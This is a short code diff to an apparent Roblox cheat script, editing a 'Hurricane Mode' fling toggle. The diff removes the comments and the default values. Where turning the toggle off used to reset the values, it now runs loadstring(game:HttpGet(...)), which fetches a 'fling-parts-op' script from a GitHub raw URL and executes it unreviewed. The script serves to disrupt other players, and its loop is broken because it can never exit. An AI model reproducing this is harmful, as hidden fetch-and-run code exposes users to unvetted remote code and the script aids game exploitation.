@@ -207,27 +207,26 @@ PlayerSection:AddSlider({
     end    
 })
 
-local defaultRadius = 1 -- Set the default value for radius
-local defaultAngleSpeed = 1 -- Set the default value for angleSpeed
+
+
 
 PlayerSection:AddToggle({
     Name = "Hurricane Mode",
     Default = false,
     Callback = function(Value)
         if Value then
-            -- Start changing the radius and angleSpeed every 0.1 seconds
             while Value do
-                radius = math.random(25, 100) -- Set radius to a random value between 25 and 100
-                angleSpeed = math.random(25, 50) -- Set angleSpeed to a random value between 25 and 50
-                task.wait(0.1) -- Wait for 0.1 seconds before the next change
+                radius = math.random(25, 100)
+                angleSpeed = math.random(25, 50)
+                task.wait(0.1)
             end
         else
-            -- When the toggle is turned off, reset radius and angleSpeed
-            radius = defaultRadius
-            angleSpeed = defaultAngleSpeed
+
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/RSC-HUB/RobloxScriptsHub/refs/heads/main/fling-parts-op"))()
         end
     end    
 })
+
 
 
 
